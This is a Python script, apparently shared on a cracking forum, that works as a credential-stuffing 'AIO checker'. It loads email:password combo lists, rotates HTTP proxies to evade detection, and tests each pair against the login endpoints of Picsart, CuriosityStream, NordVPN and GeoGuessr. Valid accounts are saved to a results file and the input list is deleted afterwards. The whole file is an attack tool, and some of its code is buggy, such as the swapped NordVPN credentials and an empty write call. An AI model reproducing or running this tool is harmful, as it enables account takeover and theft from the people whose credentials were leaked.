import os
from os import system
import json
try:
  import requests
except:
  system('pip install requests')
  import requests
try:
  import random
except :  
  system('pip install random')
  import random
try:
  import time
  from time import sleep
except :
  system('pip install time')
  import time
  from time import sleep

def picstart(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
      }
  )
  url = 'https://api.picsart.com/users/signin.json'
  data = {"email":x,"password":y,"provider":"picsart"}
  r = requests.post(url, json=data, proxies=proxy,headers=headers)
  if 'incorrect' in r.text:
    status = 'false'
  elif 'success' in r.text:
    status = 'true'
  else :
    status = 'false'
  return status
def curiositystream(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
      }
  )
  url = 'https://api.curiositystream.com/v1/login/'
  data = {"email":x,"password":y}
  r = requests.post(url, json=data, proxies=proxy,headers=headers)
  if 'error' in r.text:
    status = 'false'
  elif 'success' in r.text:
    status = 'true'
  else :
    status = 'false'
  return status
def nordvpn(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'NordApp iOS (applestore/5.0.5) iOS/13.3.1',
      }
  )
  url = "https://zwyr157wwiu6eior.com/v1/users/tokens" 
  data = "password="+x+"&username="+y
  r = requests.post(url, json=data, proxies=proxy,headers=headers)
  if 'Invalid username' in r.text:
    status = 'false'
  elif 'token' in r.text:
    status = 'true'
  else :
    status = 'false'
  return status
def geoguessr(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()

  headers.update(
      {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
      }
  )
  url = 'https://www.geoguessr.com/api/v3/accounts/signin'
  email = x
  password = y
  data = {"email":email,"password":password}
  r = requests.post(url, json=data, proxies=proxy,headers=headers)
  if 'Hmm' in r.text:
    status = 'false'
  if 'created' in r.text:
    status = 'true'
  else:
    status = 'false'
  return status
def proxy_loader(proxyfile):
  lines = open(proxyfile).read().splitlines()
  proxy =random.choice(lines)
  proxies = {"http": proxy}
  return proxies

def combo_loader():
  print('\nModules:\n1 : GeoGussr\n2 : Curiosity Stream\n3 : NordVPN\n4 : Picstart')
  module = input('Please input module number : ')
  file = input(('Please input your combo file : '))
  file2 = input(('Please input your proxy file(Only Http) : '))

  try:
    f = open(file2,"r")
    f = open(file, "r")
  except:
    exit()
  f = open(file, "r")
  for x in f:
    proxyoutput = proxy_loader(file2)
    if module == '1':
      output = geoguessr(x,proxyoutput)
    elif module == '2':
      output = curiositystream(x,proxyoutput)
    elif module == '3':
      output = nordvpn(x,proxyoutput)
    elif module == '4':
      output = picstart(x,proxyoutput)
    else:
      print('Bruh,Chose a Valid module')
      time.sleep(10)
      quit()
    if output == 'true' :
      print('valid : '+ x ) 
      isdir = os.path.isdir('results')
      if isdir == False :
        os.mkdir('results')
      f = open('results/valid.txt','a+')
      f.write(x+ '\n')
    if output == 'false' : 
      print('invalid ' + x) 
    else:
      print(output)
  return file
      


print('Welcome to AIO checker by cracked.to/lamlucius8')
sleep(5)


output = combo_loader()
os.remove(output)
e = open('Nothing.txt','a+')
pogchamp = ('Rep me on Cracked.io! cracked.io/lamlucius8 !!!!! ')
e.write()
print('All valid accounts will be in results folder valid.txt')
sleep(15)
